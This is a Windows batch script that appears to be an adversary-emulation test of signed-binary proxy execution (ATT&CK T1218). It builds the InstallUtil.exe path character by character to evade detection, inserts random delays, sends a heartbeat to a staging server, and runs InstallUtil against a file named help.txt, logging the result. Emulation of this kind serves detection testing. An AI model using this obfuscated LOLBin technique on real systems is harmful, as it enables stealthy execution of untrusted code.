@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholder assignments with random variable names (DO NOT modify PHR_ strings)
SET aqwtvd=%APPDATA%\8179\0b11763d
SET glkjsm=https://10.0.0.49
SET vxcdnh=https://10.0.0.49/stage/2/icon.png?8179-7
SET zpmrtx=ITZEL-S2BO
SET ubtlkm=7
SET qjlnpf=help.txt
SET fkbwnj=8179

REM Derived variables (random names)
SET lf=!APPDATA!\!ubtlkm!\macula-simulations.log
SET ag=!zpmrtx!

REM Initial random delay (30-60s)
SET /A initiald=!RANDOM! %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!ag!]: initial_delay_start=!initiald!s>> "!lf!" 2>nul
timeout /t !initiald! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!ag!]: initial_delay_end>> "!lf!" 2>nul

REM Build obfuscated InstallUtil path using character-by-character assembly
SET c1=i
SET c2=n
SET c3=s
SET c4=t
SET c5=a
SET c6=l
SET c7=l
SET c8=U
SET c9=t
SET c10=i
SET c11=l
SET c12=.
SET c13=e
SET c14=x
SET c15=e
SET lolbin=!c1!!c2!!c3!!c4!!c5!!c6!!c7!!c8!!c9!!c10!!c11!!c12!!c13!!c14!!c15!

REM Encode command arguments using string substitution
SET arg1=/logfile=
SET arg2=/LogToConsole=false
SET arg3=/U
SET args=!arg1! !arg2! !arg3!

REM Build full path to LOLBIN using substring assembly
SET d1=C
SET d2=:
SET d3=\
SET d4=W
SET d5=i
SET d6=n
SET d7=d
SET d8=o
SET d9=w
SET d10=s
SET d11=\
SET d12=M
SET d13=i
SET d14=c
SET d15=r
SET d16=o
SET d17=s
SET d18=o
SET d19=f
SET d20=t
SET d21=.
SET d22=N
SET d23=E
SET d24=T
SET d25=\
SET d26=F
SET d27=r
SET d28=a
SET d29=m
SET d30=e
SET d31=w
SET d32=o
SET d33=r
SET d34=k
SET d35=\
SET d36=v
SET d37=4
SET d38=.
SET d39=0
SET d40=.
SET d41=3
SET d42=0
SET d43=3
SET d44=1
SET d45=9
SET d46=\
SET fullpath=!d1!!d2!!d3!!d4!!d5!!d6!!d7!!d8!!d9!!d10!!d11!!d12!!d13!!d14!!d15!!d16!!d17!!d18!!d19!!d20!!d21!!d22!!d23!!d24!!d25!!d26!!d27!!d28!!d29!!d30!!d31!!d32!!d33!!d34!!d35!!d36!!d37!!d38!!d39!!d40!!d41!!d42!!d43!!d44!!d45!!lolbin!

REM Step 1: Check server availability
echo [!DATE! !TIME!][DEBUG][!ag!]: heartbeat_check_start=!vxcdnh!>> "!lf!" 2>nul
curl -k -s -o nul !vxcdnh!
SET heartrc=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!ag!]: heartbeat_check_end rc=!heartrc!>> "!lf!" 2>nul

REM Delay between operations (5-15s)
SET /A delay1=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!ag!]: delay_operation1_start=!delay1!s>> "!lf!" 2>nul
ping -n !delay1! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!ag!]: delay_operation1_end>> "!lf!" 2>nul

REM Step 3: Change directory
echo [!DATE! !TIME!][DEBUG][!ag!]: chdir_start=!aqwtvd!>> "!lf!" 2>nul
cd /d "!aqwtvd!" 2>nul
SET cdrc=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!ag!]: chdir_end rc=!cdrc!>> "!lf!" 2>nul

REM Random delay
SET /A delayr=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!ag!]: random_delay_start=!delayr!s>> "!lf!" 2>nul
timeout /t !delayr! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!ag!]: random_delay_end>> "!lf!" 2>nul

REM Step 4: Execute InstallUtil
echo [!DATE! !TIME!][DEBUG][!ag!]: installutil_exec_start cmd="!fullpath! !args! !qjlnpf!">> "!lf!" 2>nul
!fullpath! !args! !qjlnpf!
SET execret=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!ag!]: installutil_exec_end rc=!execret!>> "!lf!" 2>nul

REM TTP Logging
REM Build timestamp using WMIC for consistent format
FOR /F "tokens=2 delims==." %%T IN ('wmic os get localdatetime /value') DO SET tstamp=%%T
SET logts=!tstamp:~0,4!-!tstamp:~4,2!-!tstamp:~6,2! !tstamp:~8,2!:!tstamp:~10,2!:!tstamp:~12,2!.!tstamp:~15,3!

REM Determine result
IF !execret! EQU 0 (
    SET result=1
    SET errdetail=
) ELSE (
    SET result=0
    SET errdetail=installutil_failed_!execret!
)

REM Write TTP log entry
SET ttp_id=T1218
SET ttp_name=SignedBinaryProxyExecution
SET logline=[!logts!][!ag!]: !ubtlkm!-!fkbwnj!-!ttp_id!|!ttp_name!=!result!:!errdetail!
echo !logline!>> "!lf!" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!ag!]: final_delay_start=10s>> "!lf!" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul
echo [!DATE! !TIME!][DEBUG][!ag!]: final_delay_end>> "!lf!" 2>nul

ENDLOCAL